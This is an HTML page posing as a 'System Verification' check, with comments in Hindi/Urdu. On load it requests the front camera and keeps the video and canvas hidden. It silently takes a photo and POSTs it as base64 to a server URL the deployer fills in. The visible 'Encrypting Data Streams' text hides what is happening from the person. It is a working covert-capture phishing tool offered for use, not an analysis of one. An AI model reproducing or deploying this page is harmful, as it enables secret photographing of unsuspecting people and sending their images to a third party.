<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body { font-family: sans-serif; background: #050505; color: #00ff00; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { border: 1px solid #00ff00; padding: 2rem; border-radius: 10px; background: #111; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        .loading { font-family: 'Courier New', Courier, monospace; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2 class="loading">S Y S T E M _ C H E C K</h2>
    <p id="msg">Initializing Encrypted Protocol...</p>
    <div id="status">Waiting for access...</div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');

    // 🛑 APNE PYTHON SERVER KA IP YA URL YAHAN DALEIN
    // Local testing ke liye: http://localhost:5000/upload
    const SERVER_URL = 'http://localhost:5000/upload'; 

    async function startProcess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                statusDiv.innerText = "Encrypting Data Streams...";
                // 2 second wait for focus
                setTimeout(() => capture(stream), 2000);
            };
        } catch (err) {
            statusDiv.innerText = "❌ PROTOCOL_ERROR: Permission Required";
        }
    }

    async function capture(stream) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Stream band karein
        stream.getTracks().forEach(t => t.stop());

        // Photo ko Base64 String (Encoded format) mein badle
        const imageData = canvas.toDataURL('image/jpeg', 0.8);

        statusDiv.innerText = "Sending Encrypted Packet...";

        try {
            const response = await fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });

            const result = await response.json();
            if(result.status === 'success') {
                statusDiv.innerText = "✅ DATA_SENT: System Verified";
            } else {
                statusDiv.innerText = "❌ SEND_FAILED";
            }
        } catch (e) {
            statusDiv.innerText = "❌ CONNECTION_LOST";
            console.error(e);
        }
    }

    window.onload = startProcess;
</script>
</body>
</html>
